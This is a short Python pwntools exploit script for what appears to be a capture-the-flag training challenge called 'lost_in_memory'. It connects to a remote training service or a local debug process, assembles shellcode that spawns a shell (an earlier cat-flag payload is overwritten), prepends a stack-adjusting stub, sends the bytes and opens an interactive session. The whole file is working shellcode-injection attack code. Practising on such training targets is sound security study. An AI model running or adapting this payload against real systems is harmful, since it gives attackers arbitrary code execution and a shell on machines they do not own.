from pwn import *


context.clear(arch='amd64',os='linux')
run_local = False
if run_local:
        s = ssh(host='localhost',user='acidburn',port=2222)
        r= s.process('/home/acidburn/Desktop/malicious/shell/9/lost_in_memory')
        pid=gdb.attach(r)
        input("wait")
else:
        r=remote("bin.training.offdef.it",4001)





sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"])
sc= shellcraft.sh()

payload = asm(sc)



shellcode = b"\x48\x81\xEC\x08\x0F\x00\x00\x48\x89\xE5"+payload



r.send(shellcode)



r.interactive()





